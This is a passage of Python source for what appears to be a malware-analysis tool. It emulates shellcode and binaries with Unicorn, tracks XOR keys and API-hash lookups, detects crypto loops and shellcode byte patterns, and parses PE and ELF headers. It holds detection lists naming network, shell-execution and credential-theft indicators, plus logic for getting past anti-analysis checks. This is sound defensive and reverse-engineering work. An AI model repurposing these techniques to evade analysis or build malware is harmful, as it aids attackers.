            0x7C0DFCAA: "kernel32.dll!GetProcAddress", 
            0xEC0E4E8E: "kernel32.dll!LoadLibraryA",
            0x91AFCA54: "kernel32.dll!VirtualAlloc",
            0x6F721347: "ntdll.dll!RtlExitUserThread",
            0x5FC8D902: "kernel32.dll!WinExec",
            0x0E8AFE98: "kernel32.dll!WriteFile",
            0x876F8B31: "ws2_32.dll!WSAStartup",
            0xADF509D9: "ws2_32.dll!WSASocketA",
            0x60AAF9EC: "ws2_32.dll!connect",
            0x614D6E75: "ws2_32.dll!recv",
            0x5F327B64: "ws2_32.dll!send",
        }
        
        instruction_count = [0]
        trace = []
        xor_keys = []
        api_hashes = []
        decoded = []
        syscalls = []
        
        # Track XOR operations for key extraction
        last_xor_value = [None]
        
        def hook_code(uc, address, size, user_data):
            nonlocal instruction_count, trace, xor_keys, api_hashes, syscalls
            instruction_count[0] += 1
            
            if instruction_count[0] <= 200:
                trace.append({
                    "address": hex(address),
                    "offset": address - base_address
                })
            
            try:
                code = uc.mem_read(address, min(size, 15))
                
                # Detect XOR operations (common in shellcode)
                # XOR reg, imm8 (0x83 /6 ib or 0x80 /6 ib)
                # XOR reg, reg (0x31 or 0x33)
                if code[0] in [0x31, 0x33]:  # XOR r/m, r or XOR r, r/m
                    # Get register values to find XOR key
                    if is_64bit:
                        eax = uc.reg_read(UC_X86_REG_RAX)
                    else:
                        eax = uc.reg_read(UC_X86_REG_EAX)
                    if eax != 0 and eax not in xor_keys:
                        xor_keys.append(eax & 0xFF)
                
                # Detect API hash lookup pattern
                # Common: push hash; call resolve_api
                if is_64bit:
                    eax = uc.reg_read(UC_X86_REG_RAX)
                else:
                    eax = uc.reg_read(UC_X86_REG_EAX)
                
                if eax in known_api_hashes:
                    api_hashes.append({
                        "hash": hex(eax),
                        "api": known_api_hashes[eax],
                        "address": hex(address)
                    })
                
                # Detect syscall/sysenter (Windows shellcode)
                if code[0] == 0x0F and len(code) > 1:
                    if code[1] == 0x34:  # SYSENTER
                        syscalls.append({"type": "sysenter", "address": hex(address)})
                    elif code[1] == 0x05:  # SYSCALL
                        syscalls.append({"type": "syscall", "address": hex(address)})
                
                # Linux int 0x80
                if code[0] == 0xCD and len(code) > 1 and code[1] == 0x80:
                    if is_64bit:
                        syscall_num = uc.reg_read(UC_X86_REG_RAX)
                    else:
                        syscall_num = uc.reg_read(UC_X86_REG_EAX)
                    syscalls.append({
                        "type": "int80",
                        "syscall": syscall_num,
                        "address": hex(address)
                    })
                
            except Exception:
                pass
            
            if instruction_count[0] >= max_instructions:
                uc.emu_stop()
        
        emu.hook_add(UC_HOOK_CODE, hook_code)
        
        # Track memory writes for decoded strings
        def hook_mem_write(uc, access, address, size, value, user_data):
            if len(decoded) < 50:
                try:
                    data = uc.mem_read(address, min(128, 0x10000))
                    null_idx = data.find(b'\x00')
                    if 4 <= null_idx <= 100:
                        s = data[:null_idx].decode('utf-8', errors='ignore')
                        if s.isprintable() and len(s) >= 4:
                            decoded.append({
                                "address": hex(address),
                                "value": s
                            })
                except:
                    pass
        
        emu.hook_add(UC_HOOK_MEM_WRITE, hook_mem_write)
        
        # Run
        try:
            emu.emu_start(base_address, base_address + len(shellcode), timeout=timeout_ms * 1000)
        except Exception as e:
            result["error"] = f"Stopped: {str(e)}"
        
        result["success"] = True
        result["execution_trace"] = trace[:100]
        result["xor_keys_found"] = list(set(xor_keys))[:10]
        result["api_hashes"] = api_hashes
        result["decoded_strings"] = decoded
        result["syscalls"] = syscalls
        result["instructions_executed"] = instruction_count[0]
        
        # Behavior classification
        behaviors = []
        if any("ws2_32" in h.get("api", "") for h in api_hashes):
            behaviors.append("network_communication")
        if any("VirtualAlloc" in h.get("api", "") for h in api_hashes):
            behaviors.append("memory_allocation")
        if any("WinExec" in h.get("api", "") or "CreateProcess" in h.get("api", "") for h in api_hashes):
            behaviors.append("process_execution")
        if syscalls:
            behaviors.append("direct_syscalls")
        if xor_keys:
            behaviors.append("xor_encoding")
        
        result["behavior_indicators"] = behaviors
        
    except ImportError:
        result["error"] = "Unicorn not installed"
    except Exception as e:
        result["error"] = str(e)
    
    return result


def detect_crypto_loops(
    binary_data: bytes,
    architecture: str,
    function_address: int,
    base_address: int = 0x400000,
    max_iterations: int = 1000
) -> Dict[str, Any]:
    """
    Detect and analyze cryptographic/XOR loops in code.
    
    Features:
    - Identifies XOR-based decryption loops
    - Extracts encryption keys from registers
    - Detects RC4, simple XOR, rolling XOR patterns
    - Provides decryption hints
    
    Args:
        binary_data: Binary content
        architecture: Architecture
        function_address: Function to analyze
        base_address: Base address
        max_iterations: Max loop iterations to track
        
    Returns:
        Crypto loop analysis
    """
    result = {
        "success": False,
        "loops_detected": [],
        "xor_operations": [],
        "potential_keys": [],
        "loop_patterns": [],
        "rc4_indicators": [],
        "decryption_hints": [],
        "error": None,
    }
    
    try:
        from unicorn import Uc, UC_HOOK_CODE
        from unicorn import UC_ARCH_X86, UC_MODE_32, UC_MODE_64
        from unicorn.x86_const import (
            UC_X86_REG_RSP, UC_X86_REG_RAX, UC_X86_REG_RBX, UC_X86_REG_RCX,
            UC_X86_REG_RDX, UC_X86_REG_RSI, UC_X86_REG_RDI, UC_X86_REG_RIP,
            UC_X86_REG_ESP, UC_X86_REG_EAX, UC_X86_REG_EBX, UC_X86_REG_ECX,
            UC_X86_REG_EDX, UC_X86_REG_ESI, UC_X86_REG_EDI, UC_X86_REG_EIP
        )
        
        is_64bit = "64" in architecture.lower()
        uc_mode = UC_MODE_64 if is_64bit else UC_MODE_32
        emu = Uc(UC_ARCH_X86, uc_mode)
        
        # Map memory
        emu.mem_map(base_address, max(len(binary_data), 0x100000))
        emu.mem_write(base_address, binary_data[:0x100000] if len(binary_data) > 0x100000 else binary_data)
        
        stack_addr = 0x7ffe0000
        emu.mem_map(stack_addr, 0x10000)
        
        if is_64bit:
            emu.reg_write(UC_X86_REG_RSP, stack_addr + 0x8000)
        else:
            emu.reg_write(UC_X86_REG_ESP, stack_addr + 0x8000)
        
        # Track execution
        address_counts = {}
        xor_ops = []
        loop_entries = []
        instruction_count = [0]
        
        def hook_code(uc, address, size, user_data):
            nonlocal address_counts, xor_ops, loop_entries, instruction_count
            instruction_count[0] += 1
            
            # Count address visits for loop detection
            address_counts[address] = address_counts.get(address, 0) + 1
            
            # Detect loop (visited > 2 times)
            if address_counts[address] == 3:
                loop_entries.append({
                    "address": hex(address),
                    "offset": address - base_address
                })
            
            try:
                code = uc.mem_read(address, min(size, 15))
                
                # XOR instructions
                if code[0] in [0x30, 0x31, 0x32, 0x33, 0x34, 0x35]:
                    # Get operand values
                    if is_64bit:
                        regs = {
                            "RAX": uc.reg_read(UC_X86_REG_RAX),
                            "RBX": uc.reg_read(UC_X86_REG_RBX),
                            "RCX": uc.reg_read(UC_X86_REG_RCX),
                            "RDX": uc.reg_read(UC_X86_REG_RDX),
                        }
                    else:
                        regs = {
                            "EAX": uc.reg_read(UC_X86_REG_EAX),
                            "EBX": uc.reg_read(UC_X86_REG_EBX),
                            "ECX": uc.reg_read(UC_X86_REG_ECX),
                            "EDX": uc.reg_read(UC_X86_REG_EDX),
                        }
                    
                    xor_ops.append({
                        "address": hex(address),
                        "registers": {k: hex(v) for k, v in regs.items()},
                        "visit": address_counts[address]
                    })
                
                # XOR with immediate
                if code[0] == 0x83 and len(code) > 2 and (code[1] & 0x38) == 0x30:
                    key = code[2]
                    xor_ops.append({
                        "address": hex(address),
                        "immediate_key": hex(key),
                        "type": "xor_imm8"
                    })
                
            except Exception:
                pass
            
            if instruction_count[0] >= max_iterations * 10:
                uc.emu_stop()
        
        emu.hook_add(UC_HOOK_CODE, hook_code)
        
        # Run
        try:
            emu.emu_start(function_address, function_address + 0x1000, timeout=3000000)
        except Exception:
            pass
        
        result["success"] = True
        result["loops_detected"] = loop_entries[:20]
        result["xor_operations"] = xor_ops[:50]
        
        # Extract potential keys from XOR operations
        keys = set()
        for xor in xor_ops:
            if "immediate_key" in xor:
                keys.add(int(xor["immediate_key"], 16))
            if "registers" in xor:
                for reg, val in xor["registers"].items():
                    v = int(val, 16) & 0xFF
                    if 0 < v < 0xFF:
                        keys.add(v)
        
        result["potential_keys"] = [hex(k) for k in list(keys)[:20]]
        
        # Detect patterns
        patterns = []
        if len(loop_entries) > 0 and len(xor_ops) > 5:
            patterns.append("xor_loop_decryption")
        
        # RC4 indicators: 256-iteration loop + swap pattern
        if any(address_counts.get(addr, 0) >= 256 for addr in address_counts):
            patterns.append("possible_rc4_ksa")
            result["rc4_indicators"].append("256+ iteration loop detected")
        
        result["loop_patterns"] = patterns
        
        # Decryption hints
        if keys:
            result["decryption_hints"].append(f"Try XOR with keys: {', '.join(result['potential_keys'][:5])}")
        if "xor_loop_decryption" in patterns:
            result["decryption_hints"].append("Single-byte XOR loop detected - likely simple encryption")
        if "possible_rc4_ksa" in patterns:
            result["decryption_hints"].append("RC4-like pattern - look for key schedule initialization")
        
    except ImportError:
        result["error"] = "Unicorn not installed"
    except Exception as e:
        result["error"] = str(e)
    
    return result


def explore_branches(
    binary_data: bytes,
    architecture: str,
    function_address: int,
    base_address: int = 0x400000,
    max_paths: int = 5,
    max_instructions_per_path: int = 500
) -> Dict[str, Any]:
    """
    Explore multiple execution paths by forcing different branch outcomes.
    
    Features:
    - Identifies conditional branches
    - Explores both taken/not-taken paths
    - Compares behaviors across paths
    - Finds path-dependent strings/behaviors
    
    Args:
        binary_data: Binary content
        architecture: Architecture
        function_address: Function to analyze
        base_address: Base address
        max_paths: Maximum paths to explore
        max_instructions_per_path: Instructions per path
        
    Returns:
        Branch exploration results
    """
    result = {
        "success": False,
        "branches_found": [],
        "paths_explored": [],
        "path_differences": [],
        "conditional_behaviors": [],
        "strings_by_path": {},
        "error": None,
    }
    
    try:
        from unicorn import Uc, UC_HOOK_CODE, UC_HOOK_MEM_WRITE
        from unicorn import UC_ARCH_X86, UC_MODE_32, UC_MODE_64
        from unicorn.x86_const import (
            UC_X86_REG_RSP, UC_X86_REG_RIP, UC_X86_REG_EFLAGS,
            UC_X86_REG_ESP, UC_X86_REG_EIP
        )
        
        is_64bit = "64" in architecture.lower()
        uc_mode = UC_MODE_64 if is_64bit else UC_MODE_32
        
        # First pass: find branches
        emu = Uc(UC_ARCH_X86, uc_mode)
        emu.mem_map(base_address, max(len(binary_data), 0x100000))
        emu.mem_write(base_address, binary_data[:0x100000] if len(binary_data) > 0x100000 else binary_data)
        
        stack_addr = 0x7ffe0000
        emu.mem_map(stack_addr, 0x10000)
        
        if is_64bit:
            emu.reg_write(UC_X86_REG_RSP, stack_addr + 0x8000)
        else:
            emu.reg_write(UC_X86_REG_ESP, stack_addr + 0x8000)
        
        branches = []
        instruction_count = [0]
        
        # Conditional jump opcodes
        cond_jumps = [
            0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,  # Jcc short
            0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
        ]
        
        def hook_find_branches(uc, address, size, user_data):
            nonlocal branches, instruction_count
            instruction_count[0] += 1
            
            try:
                code = uc.mem_read(address, min(size, 6))
                
                # Check for conditional jumps
                if code[0] in cond_jumps:
                    # Short jump
                    offset = code[1] if code[1] < 128 else code[1] - 256
                    target = address + 2 + offset
                    branches.append({
                        "address": hex(address),
                        "target": hex(target),
                        "fallthrough": hex(address + 2),
                        "type": "jcc_short"
                    })
                
                # 0F 8x xx xx xx xx - Jcc near
                if code[0] == 0x0F and len(code) >= 6 and 0x80 <= code[1] <= 0x8F:
                    offset = int.from_bytes(code[2:6], 'little', signed=True)
                    target = address + 6 + offset
                    branches.append({
                        "address": hex(address),
                        "target": hex(target),
                        "fallthrough": hex(address + 6),
                        "type": "jcc_near"
                    })
                
            except Exception:
                pass
            
            if instruction_count[0] >= max_instructions_per_path:
                uc.emu_stop()
        
        emu.hook_add(UC_HOOK_CODE, hook_find_branches)
        
        try:
            emu.emu_start(function_address, function_address + 0x10000, timeout=2000000)
        except Exception:
            pass
        
        result["branches_found"] = branches[:50]
        
        # Explore different paths for first few branches
        paths_explored = []
        strings_by_path = {}
        
        for i, branch in enumerate(branches[:max_paths]):
            # Try forcing different branch outcomes
            for take_branch in [True, False]:
                path_id = f"branch_{i}_{'taken' if take_branch else 'nottaken'}"
                path_strings = []
                path_trace = []
                
                try:
                    # Fresh emulator for each path
                    emu2 = Uc(UC_ARCH_X86, uc_mode)
                    emu2.mem_map(base_address, max(len(binary_data), 0x100000))
                    emu2.mem_write(base_address, binary_data[:0x100000] if len(binary_data) > 0x100000 else binary_data)
                    emu2.mem_map(stack_addr, 0x10000)
                    
                    if is_64bit:
                        emu2.reg_write(UC_X86_REG_RSP, stack_addr + 0x8000)
                    else:
                        emu2.reg_write(UC_X86_REG_ESP, stack_addr + 0x8000)
                    
                    branch_addr = int(branch["address"], 16)
                    path_instr = [0]
                    
                    def path_hook(uc, address, size, user_data):
                        path_instr[0] += 1
                        if path_instr[0] <= 50:
                            path_trace.append(hex(address))
                        
                        # Force branch outcome at target address
                        if address == branch_addr:
                            if take_branch:
                                # Force jump by setting ZF or modifying IP
                                target = int(branch["target"], 16)
                                if is_64bit:
                                    uc.reg_write(UC_X86_REG_RIP, target)
                                else:
                                    uc.reg_write(UC_X86_REG_EIP, target)
                            # else: let it fall through naturally
                        
                        if path_instr[0] >= max_instructions_per_path:
                            uc.emu_stop()
                    
                    def path_mem_hook(uc, access, address, size, value, user_data):
                        try:
                            data = uc.mem_read(address, 64)
                            null = data.find(b'\x00')
                            if 4 <= null <= 60:
                                s = data[:null].decode('utf-8', errors='ignore')
                                if s.isprintable():
                                    path_strings.append(s)
                        except:
                            pass
                    
                    emu2.hook_add(UC_HOOK_CODE, path_hook)
                    emu2.hook_add(UC_HOOK_MEM_WRITE, path_mem_hook)
                    
                    emu2.emu_start(function_address, function_address + 0x10000, timeout=1000000)
                    
                except Exception:
                    pass
                
                paths_explored.append({
                    "path_id": path_id,
                    "branch": branch["address"],
                    "direction": "taken" if take_branch else "not_taken",
                    "instructions": len(path_trace),
                    "strings_found": len(path_strings)
                })
                strings_by_path[path_id] = list(set(path_strings))[:10]
        
        result["success"] = True
        result["paths_explored"] = paths_explored
        result["strings_by_path"] = strings_by_path
        
        # Find path differences
        differences = []
        path_ids = list(strings_by_path.keys())
        for i in range(0, len(path_ids), 2):
            if i + 1 < len(path_ids):
                set1 = set(strings_by_path[path_ids[i]])
                set2 = set(strings_by_path[path_ids[i + 1]])
                if set1 != set2:
                    differences.append({
                        "path1": path_ids[i],
                        "path2": path_ids[i + 1],
                        "unique_to_path1": list(set1 - set2),
                        "unique_to_path2": list(set2 - set1)
                    })
        
        result["path_differences"] = differences
        
    except ImportError:
        result["error"] = "Unicorn not installed"
    except Exception as e:
        result["error"] = str(e)
    
    return result


async def run_comprehensive_binary_emulation(
    binary_data: bytes,
    architecture: str,
    ghidra_result: Optional[Dict[str, Any]] = None,
    base_address: int = 0x400000,
    entry_point: Optional[int] = None,
    enable_api_hooks: bool = True,
    enable_crypto_detection: bool = True,
    enable_branch_exploration: bool = True,
    max_functions: int = 10
) -> Dict[str, Any]:
    """
    Run comprehensive emulation analysis combining all enhanced features.
    
    This is the main entry point for advanced emulation that:
    1. Uses Ghidra results to identify interesting functions
    2. Runs emulation with API hooking and anti-analysis bypass
    3. Detects crypto loops and extracts keys
    4. Explores multiple execution paths
    5. Extracts shellcode if detected
    
    Args:
        binary_data: Raw binary content
        architecture: Target architecture
        ghidra_result: Ghidra decompilation for function info
        base_address: Base load address
        entry_point: Entry point (auto-detected if None)
        enable_api_hooks: Enable Windows/Linux API hooking
        enable_crypto_detection: Enable crypto loop detection
        enable_branch_exploration: Enable multi-path exploration
        max_functions: Max functions to analyze
        
    Returns:
        Comprehensive emulation analysis
    """
    result = {
        "success": False,
        "architecture": architecture,
        "base_address": hex(base_address),
        "summary": {
            "total_functions_analyzed": 0,
            "strings_decrypted": 0,
            "anti_analysis_bypassed": 0,
            "api_calls_detected": 0,
            "crypto_patterns_found": 0,
            "paths_explored": 0,
        },
        "entry_point_analysis": None,
        "function_emulations": [],
        "api_call_summary": [],
        "bypassed_protections": [],
        "decrypted_strings": [],
        "crypto_analysis": None,
        "branch_analysis": None,
        "shellcode_regions": [],
        "behavioral_indicators": [],
        "packing_analysis": None,
        "section_mapping": None,
        "taint_analysis": None,
        "recommendations": [],
        "errors": [],
    }
    
    # Parse PE/ELF for proper section mapping
    pe_info = parse_pe_sections(binary_data)
    elf_info = parse_elf_sections(binary_data)
    
    if pe_info["is_pe"]:
        result["section_mapping"] = {
            "format": "PE",
            "image_base": hex(pe_info["image_base"]),
            "entry_point": hex(pe_info["image_base"] + pe_info["entry_point"]),
            "is_64bit": pe_info["is_64bit"],
            "sections": [
                {
                    "name": s["name"],
                    "virtual_address": hex(pe_info["image_base"] + s["virtual_address"]),
                    "size": s["virtual_size"],
                    "executable": s["executable"],
                    "writable": s["writable"],
                }
                for s in pe_info["sections"]
            ]
        }
        if not entry_point:
            entry_point = pe_info["image_base"] + pe_info["entry_point"]
        base_address = pe_info["image_base"]
        architecture = "x64" if pe_info["is_64bit"] else "x86"
    elif elf_info["is_elf"]:
        result["section_mapping"] = {
            "format": "ELF",
            "entry_point": hex(elf_info["entry_point"]),
            "is_64bit": elf_info["is_64bit"],
            "architecture": elf_info["architecture"],
            "segments": len(elf_info["sections"])
        }
        if not entry_point and elf_info["entry_point"]:
            entry_point = elf_info["entry_point"]
        architecture = elf_info["architecture"]
    
    result["architecture"] = architecture
    result["base_address"] = hex(base_address)
    
    # Run packing/unpacking detection first
    try:
        unpack_result = extract_unpacked_code(
            binary_data=binary_data,
            architecture=architecture,
            timeout_ms=5000,
            max_instructions=20000
        )
        
        if unpack_result.get("packer_detected"):
            result["packing_analysis"] = {
                "is_packed": True,
                "unpacked_regions": unpack_result.get("unpacked_regions", []),
                "oep_candidates": unpack_result.get("oep_candidates", []),
                "strings_after_unpack": unpack_result.get("unpacked_strings", [])[:20],
            }
            result["summary"]["packer_detected"] = True
            
            # Use unpacked strings
            for s in unpack_result.get("unpacked_strings", []):
                result["decrypted_strings"].append({
                    "value": s.get("value"),
                    "address": s.get("address"),
                    "source": "unpacking"
                })
        else:
            result["packing_analysis"] = {"is_packed": False}
            
    except Exception as e:
        result["errors"].append(f"Packing detection: {str(e)}")
    
    # Identify interesting functions from Ghidra
    interesting_functions = []
    
    if ghidra_result:
        functions = ghidra_result.get("functions", [])
        
        # Priority 1: Functions with suspicious names
        suspicious_names = [
            "decrypt", "deobfuscate", "decode", "unpack", "decompress",
            "xor", "rc4", "aes", "encrypt", "cipher",
            "anti", "debug", "vm", "sandbox", "check",
            "inject", "hook", "patch", "loader", "stub",
            "shell", "payload", "execute", "run", "call",
        ]
        
        for func in functions:
            name = func.get("name", "").lower()
            addr = func.get("address", 0)
            if isinstance(addr, str):
                addr = int(addr, 16) if addr.startswith("0x") else int(addr)
            
            priority = 0
            for sus in suspicious_names:
                if sus in name:
                    priority = 2
                    break
            
            # Priority 2: Small functions (often crypto/decode helpers)
            size = func.get("size", 0)
            if 20 < size < 200:
                priority = max(priority, 1)
            
            if priority > 0 or len(interesting_functions) < 5:
                interesting_functions.append({
                    "name": func.get("name", "unknown"),
                    "address": addr,
                    "size": size,
                    "priority": priority
                })
        
        # Sort by priority
        interesting_functions.sort(key=lambda x: -x["priority"])
        interesting_functions = interesting_functions[:max_functions]
    
    # Add entry point if provided
    if entry_point:
        interesting_functions.insert(0, {
            "name": "entry_point",
            "address": entry_point,
            "size": 0,
            "priority": 3
        })
    
    # Run emulation with API hooks on entry point
    if interesting_functions and enable_api_hooks:
        try:
            entry = interesting_functions[0]
            api_result = emulate_with_api_hooks(
                binary_data=binary_data,
                architecture=architecture,
                function_address=entry["address"],
                base_address=base_address,
                timeout_ms=5000,
                max_instructions=10000,
                bypass_anti_analysis=True
            )
            
            result["entry_point_analysis"] = {
                "function": entry["name"],
                "address": hex(entry["address"]),
                "result": api_result
            }
            
            if api_result.get("success"):
                result["summary"]["strings_decrypted"] += len(api_result.get("strings_decrypted", []))
                result["summary"]["anti_analysis_bypassed"] += len(api_result.get("bypassed_checks", []))
                result["summary"]["api_calls_detected"] += len(api_result.get("api_calls", []))
                
                result["decrypted_strings"].extend(api_result.get("strings_decrypted", []))
                result["bypassed_protections"].extend(api_result.get("bypassed_checks", []))
                result["api_call_summary"].extend(api_result.get("api_calls", []))
            
        except Exception as e:
            result["errors"].append(f"Entry point emulation: {str(e)}")
    
    # Analyze suspicious functions
    for func in interesting_functions[1:max_functions]:
        try:
            func_result = emulate_with_api_hooks(
                binary_data=binary_data,
                architecture=architecture,
                function_address=func["address"],
                base_address=base_address,
                timeout_ms=3000,
                max_instructions=5000,
                bypass_anti_analysis=True
            )
            
            if func_result.get("success"):
                result["function_emulations"].append({
                    "function": func["name"],
                    "address": hex(func["address"]),
                    "strings_found": len(func_result.get("strings_decrypted", [])),
                    "bypassed": len(func_result.get("bypassed_checks", [])),
                })
                
                result["decrypted_strings"].extend(func_result.get("strings_decrypted", []))
                result["summary"]["total_functions_analyzed"] += 1
                
        except Exception as e:
            result["errors"].append(f"Function {func['name']}: {str(e)}")
    
    # Crypto loop detection
    if enable_crypto_detection and interesting_functions:
        try:
            # Find functions likely to have crypto
            crypto_funcs = [f for f in interesting_functions 
                          if any(x in f["name"].lower() 
                                for x in ["crypt", "xor", "decode", "decrypt", "cipher"])]
            
            if not crypto_funcs and interesting_functions:
                crypto_funcs = interesting_functions[:3]
            
            for func in crypto_funcs[:3]:
                crypto_result = detect_crypto_loops(
                    binary_data=binary_data,
                    architecture=architecture,
                    function_address=func["address"],
                    base_address=base_address,
                    max_iterations=500
                )
                
                if crypto_result.get("success"):
                    if crypto_result.get("loops_detected") or crypto_result.get("potential_keys"):
                        result["crypto_analysis"] = {
                            "function": func["name"],
                            "address": hex(func["address"]),
                            "result": crypto_result
                        }
                        result["summary"]["crypto_patterns_found"] += len(
                            crypto_result.get("loops_detected", [])
                        )
                        break
                        
        except Exception as e:
            result["errors"].append(f"Crypto detection: {str(e)}")
    
    # Branch exploration
    if enable_branch_exploration and interesting_functions:
        try:
            # Explore entry point branches
            branch_result = explore_branches(
                binary_data=binary_data,
                architecture=architecture,
                function_address=interesting_functions[0]["address"],
                base_address=base_address,
                max_paths=5,
                max_instructions_per_path=300
            )
            
            if branch_result.get("success"):
                result["branch_analysis"] = branch_result
                result["summary"]["paths_explored"] = len(
                    branch_result.get("paths_explored", [])
                )
                
        except Exception as e:
            result["errors"].append(f"Branch exploration: {str(e)}")
    
    # Detect shellcode regions (high-entropy executable sections)
    try:
        # Look for NOP sleds and common shellcode patterns
        shellcode_patterns = [
            b'\x90' * 10,  # NOP sled
            b'\xcc' * 4,   # INT3 sled
            b'\x31\xc0',   # xor eax, eax
            b'\x31\xdb',   # xor ebx, ebx
            b'\x31\xc9',   # xor ecx, ecx
            b'\x31\xd2',   # xor edx, edx
            b'\x50\x53',   # push eax; push ebx (common shellcode start)
            b'\x68',       # push imm32 (often IP/port in shellcode)
        ]
        
        for i, pattern in enumerate(shellcode_patterns):
            offset = 0
            while True:
                pos = binary_data.find(pattern, offset)
                if pos == -1:
                    break
                result["shellcode_regions"].append({
                    "offset": pos,
                    "address": hex(base_address + pos),
                    "pattern": pattern.hex() if len(pattern) <= 10 else f"{pattern[:10].hex()}...",
                    "type": ["nop_sled", "int3_sled", "xor_eax", "xor_ebx", 
                            "xor_ecx", "xor_edx", "push_push", "push_imm"][i]
                })
                offset = pos + len(pattern)
                if len(result["shellcode_regions"]) >= 20:
                    break
            if len(result["shellcode_regions"]) >= 20:
                break
                
    except Exception as e:
        result["errors"].append(f"Shellcode detection: {str(e)}")
    
    # Behavioral indicators
    behaviors = set()
    
    if result["bypassed_protections"]:
        behaviors.add("anti_analysis_techniques")
    
    if result["api_call_summary"]:
        behaviors.add("dynamic_api_resolution")
    
    if result["crypto_analysis"]:
        behaviors.add("cryptographic_operations")
    
    if result["shellcode_regions"]:
        behaviors.add("possible_shellcode")
    
    if result["decrypted_strings"]:
        # Check decrypted string content
        for s in result["decrypted_strings"]:
            val = s.get("value", "").lower()
            if any(x in val for x in ["http", "tcp", "socket", "connect"]):
                behaviors.add("network_capability")
            if any(x in val for x in ["cmd", "shell", "exec", "process"]):
                behaviors.add("command_execution")
            if any(x in val for x in ["password", "key", "secret", "token"]):
                behaviors.add("credential_handling")
            if any(x in val for x in ["registry", "hkey", "software\\"]):
                behaviors.add("registry_manipulation")
    
    result["behavioral_indicators"] = list(behaviors)
    
    # Recommendations
    if "anti_analysis_techniques" in behaviors:
        result["recommendations"].append(
            "Binary uses anti-analysis - consider debugging in isolated VM"
        )
    
    if "cryptographic_operations" in behaviors and result["crypto_analysis"]:
        keys = result["crypto_analysis"].get("result", {}).get("potential_keys", [])
        if keys:
            result["recommendations"].append(
                f"Try decryption with extracted keys: {', '.join(keys[:5])}"
            )
    
    if "possible_shellcode" in behaviors:
        result["recommendations"].append(
            "Shellcode patterns detected - analyze with dedicated shellcode analyzer"
        )
    
    if result["decrypted_strings"]:
        result["recommendations"].append(
            f"Review {len(result['decrypted_strings'])} decrypted strings for IOCs"
        )
    
    # Deduplicate decrypted strings
    seen = set()
    unique_strings = []
    for s in result["decrypted_strings"]:
        val = s.get("value", "")
        if val not in seen:
            seen.add(val)
            unique_strings.append(s)
    result["decrypted_strings"] = unique_strings[:100]
    
    result["success"] = True
    
    return result


def parse_pe_sections(binary_data: bytes) -> Dict[str, Any]:
    """
    Parse PE file sections for proper memory mapping during emulation.
    
    Returns section info including:
    - Virtual addresses
    - Raw data offsets
    - Section characteristics (executable, writable, etc.)
    
    Args:
        binary_data: Raw PE file bytes
        
    Returns:
        PE section information
    """
    result = {
        "is_pe": False,
        "image_base": 0x400000,
        "entry_point": 0,
        "sections": [],
        "imports": [],
        "exports": [],
        "is_64bit": False,
        "error": None
    }
    
    try:
        # Check DOS header
        if len(binary_data) < 64 or binary_data[:2] != b'MZ':
            return result
        
        # Get PE header offset
        pe_offset = int.from_bytes(binary_data[0x3C:0x40], 'little')
        if pe_offset + 4 > len(binary_data):
            return result
        
        # Check PE signature
        if binary_data[pe_offset:pe_offset+4] != b'PE\x00\x00':
            return result
        
        result["is_pe"] = True
        
        # COFF header
        coff_offset = pe_offset + 4
        machine = int.from_bytes(binary_data[coff_offset:coff_offset+2], 'little')
        num_sections = int.from_bytes(binary_data[coff_offset+2:coff_offset+4], 'little')
        optional_header_size = int.from_bytes(binary_data[coff_offset+16:coff_offset+18], 'little')
        
        # Check architecture
        result["is_64bit"] = machine == 0x8664  # AMD64
        
        # Optional header
        opt_offset = coff_offset + 20
        magic = int.from_bytes(binary_data[opt_offset:opt_offset+2], 'little')
        
        if magic == 0x20b:  # PE32+
            result["is_64bit"] = True
            result["entry_point"] = int.from_bytes(binary_data[opt_offset+16:opt_offset+20], 'little')
            result["image_base"] = int.from_bytes(binary_data[opt_offset+24:opt_offset+32], 'little')
        else:  # PE32
            result["entry_point"] = int.from_bytes(binary_data[opt_offset+16:opt_offset+20], 'little')
            result["image_base"] = int.from_bytes(binary_data[opt_offset+28:opt_offset+32], 'little')
        
        # Parse sections
        section_offset = opt_offset + optional_header_size
        for i in range(min(num_sections, 20)):  # Limit to 20 sections
            sec_start = section_offset + (i * 40)
            if sec_start + 40 > len(binary_data):
                break
            
            name = binary_data[sec_start:sec_start+8].rstrip(b'\x00').decode('ascii', errors='ignore')
            virtual_size = int.from_bytes(binary_data[sec_start+8:sec_start+12], 'little')
            virtual_addr = int.from_bytes(binary_data[sec_start+12:sec_start+16], 'little')
            raw_size = int.from_bytes(binary_data[sec_start+16:sec_start+20], 'little')
            raw_offset = int.from_bytes(binary_data[sec_start+20:sec_start+24], 'little')
            characteristics = int.from_bytes(binary_data[sec_start+36:sec_start+40], 'little')
            
            result["sections"].append({
                "name": name,
                "virtual_address": virtual_addr,
                "virtual_size": virtual_size,
                "raw_offset": raw_offset,
                "raw_size": raw_size,
                "executable": bool(characteristics & 0x20000000),
                "writable": bool(characteristics & 0x80000000),
                "readable": bool(characteristics & 0x40000000),
            })
        
    except Exception as e:
        result["error"] = str(e)
    
    return result


def parse_elf_sections(binary_data: bytes) -> Dict[str, Any]:
    """
    Parse ELF file sections for proper memory mapping during emulation.
    
    Args:
        binary_data: Raw ELF file bytes
        
    Returns:
        ELF section information
    """
    result = {
        "is_elf": False,
        "entry_point": 0,
        "sections": [],
        "is_64bit": False,
        "architecture": "unknown",
        "error": None
    }
    
    try:
        # Check ELF magic
        if len(binary_data) < 64 or binary_data[:4] != b'\x7fELF':
            return result
        
        result["is_elf"] = True
        result["is_64bit"] = binary_data[4] == 2
        
        # Architecture
        machine = int.from_bytes(binary_data[18:20], 'little')
        arch_map = {
            0x03: "x86",
            0x3E: "x64",
            0x28: "arm",
            0xB7: "arm64",
            0x08: "mips"
        }
        result["architecture"] = arch_map.get(machine, f"unknown_{machine}")
        
        if result["is_64bit"]:
            result["entry_point"] = int.from_bytes(binary_data[24:32], 'little')
            phoff = int.from_bytes(binary_data[32:40], 'little')
            phnum = int.from_bytes(binary_data[56:58], 'little')
            phentsize = int.from_bytes(binary_data[54:56], 'little')
        else:
            result["entry_point"] = int.from_bytes(binary_data[24:28], 'little')
            phoff = int.from_bytes(binary_data[28:32], 'little')
            phnum = int.from_bytes(binary_data[44:46], 'little')
            phentsize = int.from_bytes(binary_data[42:44], 'little')
        
        # Parse program headers (segments)
        for i in range(min(phnum, 20)):
            ph_start = phoff + (i * phentsize)
            if ph_start + phentsize > len(binary_data):
                break
            
            if result["is_64bit"]:
                p_type = int.from_bytes(binary_data[ph_start:ph_start+4], 'little')
